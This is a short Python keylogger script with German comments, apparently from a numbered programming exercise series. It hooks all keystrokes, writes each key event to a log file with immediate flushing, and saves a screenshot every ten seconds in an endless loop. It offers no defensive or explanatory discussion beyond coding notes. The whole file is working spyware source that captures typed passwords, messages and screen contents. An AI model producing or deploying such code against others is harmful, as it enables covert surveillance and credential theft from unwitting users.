'''
Dieses SKript funktioniert so nicht unter Pycharm in Windows
-> use: 74_Keylogger_mit_Screenshots_anpassung_windows.py
'''

import keyboard
import datetime
import pyautogui
import time
import os

# Erstelle Ordner Screenshots wenn nicht vorhanden
if not os.path.exists("screenshots"):
    os.mkdir("screenshots")

keyboard.unhook_all() # Letzten Hook beenden

file = open("./log.txt", "w", encoding="utf-8")
file.write("Log Start: \n")

def on_key(key):
    #file.write(str(key) + "\n") # "key" ist eigentlich eine Instanz einer Klasse und muss erst in String konvertiert werden
    file.write(str(key.__dict__) + "\n") # Objekteigenschaften ausgeben -> Gibt Informatioen aus z.B. über alle Funktionen die Aufrufbar sind

    '''
    Problem file.write() sagt zu Python schreibe, WANN du es für richtig hälst
    Lösung -> Alles was in Warteschlange ist, soll sofort geschrieben werden -> file.flush()
    '''
    file.flush()
    #print(key)
    #print(key.time) # Aktuelle Uhrzeit


keyboard.hook(on_key) # Hook starten zum aufnehmen aller kommenden Tastenanschläge
#keyboard.wait() # Loop läuft ewig weiter

#Sideinformation: Objekteigenschaften ausgeben -> Gibt Informatioen aus z.B. über alle Funktionen die Aufrufbar sind
#print(keyboard.__dict__)

while True:
    time.sleep(10) # Warte 10 sec.
    current_time = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    # print(current_time)
    filename = "./screenshots/" + current_time + ".jpg"
    print(filename)
    pyautogui.screenshot(filename)

